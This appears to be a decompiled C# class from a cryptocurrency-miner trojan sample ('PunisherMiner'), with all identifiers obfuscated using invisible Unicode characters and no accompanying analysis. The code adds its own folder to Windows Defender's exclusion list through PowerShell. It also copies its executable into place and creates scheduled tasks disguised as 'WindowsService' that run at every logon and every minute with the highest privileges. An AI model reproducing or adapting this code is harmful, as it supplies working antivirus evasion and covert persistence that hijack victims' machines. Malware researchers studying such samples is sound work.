// Decompiled with JetBrains decompiler
// Type: ⁪‫‫⁮⁫‭‏‮‭‍‭‏​‬⁮⁯‫⁯‭‍‮⁭⁯‍‫‮‮‪⁯⁪⁪‍‏‏‎‬‍⁭‌⁭‮
// Assembly: PunisherMiner, Version=3.0.2.4, Culture=neutral, PublicKeyToken=null
// MVID: 0E56BAA9-6097-4239-A28F-F65DA3522EC4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Miner.gen-1f563cbfc0379c29f15ea1e40466bd6b73233a51a720f3af9adb68f1828968c8.exe

using System.IO;
using System.Reflection;

public class \u206A‫‫⁮⁫‭‏‮‭‍‭‏​‬⁮⁯‫⁯‭‍‮⁭⁯‍‫‮‮‪⁯⁪⁪‍‏‏‎‬‍⁭‌⁭‮
{
  public void \u206D​‮⁭‍⁪​‭‬‮‫⁮‮‫‏⁮‬‮‮‫⁭​‭‭‬​​‏⁫⁬‎‏‍‎⁭‭‫⁬⁭‮() => \u206D‍‪⁫⁫‫‬⁪⁪‭⁪⁬‎⁪⁬‪‎‌⁮‮⁮‭⁬‫‫‮⁫⁪‪‭⁮⁯‎⁫‎⁭⁪‎​⁯‮.\u202A‬‬⁮‫‌⁫‏‮‍‮‬‪‎‭‎⁯‪‏​‪⁯‮⁮‫‪⁫⁮‌​⁮⁯‭‍‬⁯‍‭​‫‮("powershell.exe", "Add-MpPreference -ExclusionPath '" + \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u202A‪⁫‬⁫⁪‏‮⁮⁯‫⁪‍⁭⁯‫‍‫⁯‏‪‮‮‏⁪⁭⁫‫⁬⁪⁫⁯‪⁮‏‪‏‏‏⁫‮ + "' ");

  public void \u202B⁪⁮​‮⁪‫‫‪‪‬‍​​⁪‎‍‏‬‬‍‌‍‮‭‭⁯⁬⁯‏​‪⁮‭⁯‪⁫⁯⁯‍‮()
  {
    string path = \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u202A‪⁫‬⁫⁪‏‮⁮⁯‫⁪‍⁭⁯‫‍‫⁯‏‪‮‮‏⁪⁭⁫‫⁬⁪⁫⁯‪⁮‏‪‏‏‏⁫‮;
    string str = \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u206D‎​‪‏‏‌​‫⁭‏‎⁫​‮‮‭‭‌‎⁮‎⁭‍‮‮⁮‌⁬‌‌‬‍‬​​‮⁯⁬‮‮;
    try
    {
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      if (File.Exists(path + "\\" + str))
        return;
      File.Copy(Assembly.GetExecutingAssembly().Location, path + "\\" + str);
    }
    catch
    {
    }
  }

  public void \u202C⁫⁫⁫‍‎‭⁭⁭‮⁬⁮‮‏⁯‌⁭⁪‪‍⁬​‎‬⁪⁯‎‌⁭‍⁬‭⁫⁪⁯‏‎‫‎‏‮()
  {
    string str1 = \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u202A‪⁫‬⁫⁪‏‮⁮⁯‫⁪‍⁭⁯‫‍‫⁯‏‪‮‮‏⁪⁭⁫‫⁬⁪⁫⁯‪⁮‏‪‏‏‏⁫‮;
    string str2 = \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u206D‎​‪‏‏‌​‫⁭‏‎⁫​‮‮‭‭‌‎⁮‎⁭‍‮‮⁮‌⁬‌‌‬‍‬​​‮⁯⁬‮‮;
    \u206D‍‪⁫⁫‫‬⁪⁪‭⁪⁬‎⁪⁬‪‎‌⁮‮⁮‭⁬‫‫‮⁫⁪‪‭⁮⁯‎⁫‎⁭⁪‎​⁯‮.\u202A‬‬⁮‫‌⁫‏‮‍‮‬‪‎‭‎⁯‪‏​‪⁯‮⁮‫‪⁫⁮‌​⁮⁯‭‍‬⁯‍‭​‫‮("schtasks.exe", "/delete /tn WindowsService /f");
    \u206D‍‪⁫⁫‫‬⁪⁪‭⁪⁬‎⁪⁬‪‎‌⁮‮⁮‭⁬‫‫‮⁫⁪‪‭⁮⁯‎⁫‎⁭⁪‎​⁯‮.\u202A‬‬⁮‫‌⁫‏‮‍‮‬‪‎‭‎⁯‪‏​‪⁯‮⁮‫‪⁫⁮‌​⁮⁯‭‍‬⁯‍‭​‫‮("schtasks.exe", "/create /tn WindowsService /tr \"" + str1 + "\\" + str2 + "\" /sc onlogon /rl highest");
    \u206D‍‪⁫⁫‫‬⁪⁪‭⁪⁬‎⁪⁬‪‎‌⁮‮⁮‭⁬‫‫‮⁫⁪‪‭⁮⁯‎⁫‎⁭⁪‎​⁯‮.\u202A‬‬⁮‫‌⁫‏‮‍‮‬‪‎‭‎⁯‪‏​‪⁯‮⁮‫‪⁫⁮‌​⁮⁯‭‍‬⁯‍‭​‫‮("schtasks.exe", "/create /sc MINUTE /mo 1 /tn WindowsServiceUpload /tr \"" + str1 + "\\" + str2 + "\" /f /rl highest");
  }
}
